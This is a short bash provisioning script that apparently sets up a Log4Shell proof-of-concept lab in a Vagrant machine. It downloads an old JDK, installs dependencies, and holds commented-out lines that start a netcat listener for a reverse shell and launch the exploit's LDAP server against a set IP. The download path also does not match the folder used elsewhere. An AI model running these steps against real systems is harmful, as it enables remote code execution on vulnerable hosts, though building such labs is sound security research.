#!/bin/bash

echo "Setup Log4Web POC ..."

# Clone POC Repo
echo "[+]" $( date +%T ) "Clone POC Repo"
mkdir -p -m a=rwx /home/vagrant/log4web #>/dev/null 2>&1

# Copy files
echo "[+]" $( date +%T ) "Copy POC Files"
sudo curl --output /home/vagrant/log4shell/jdk-8u201-linux-x64.tar.gz https://repo.huaweicloud.com/java/jdk/8u201-b09/jdk-8u201-linux-x64.tar.gz
sudo cp -r /vagrant/log4web /home/vagrant/log4web
cd /home/vagrant/log4web && tar -xf jdk-8u201-linux-x64.tar.gz

# Install Python 3 dependencies
cd /home/vagrant/log4web && pip3 install -r requirements.txt

# Run NetCat Listener
#nc -lvnp 9001

# Run Exploit LDAP
#python3 log4web.py --userip 192.168.56.100 --webport 8000 --lport 9001
